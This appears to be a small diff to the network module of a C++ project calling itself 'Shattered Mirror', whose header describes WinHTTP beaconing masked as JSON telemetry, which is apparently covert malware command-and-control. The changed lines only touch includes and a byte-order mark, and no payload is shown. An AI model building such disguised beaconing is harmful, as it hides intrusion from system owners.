@@ -1,4 +1,4 @@
-﻿/*=============================================================================
+/*=============================================================================
  * Shattered Mirror v1 — Atom 01: Network Communicator
  *
  * Implements WinHTTP beaconing masked as JSON telemetry. 
@@ -9,7 +9,7 @@
 #include "Atom_01_Net.h"
 #include "../Orchestrator/AtomManager.h"
 #include "../Orchestrator/Config.h"
-#include "../Orchestrator/Logger.h"
+#include <string>
 #include <cstdio>
 #include <ctime>
 
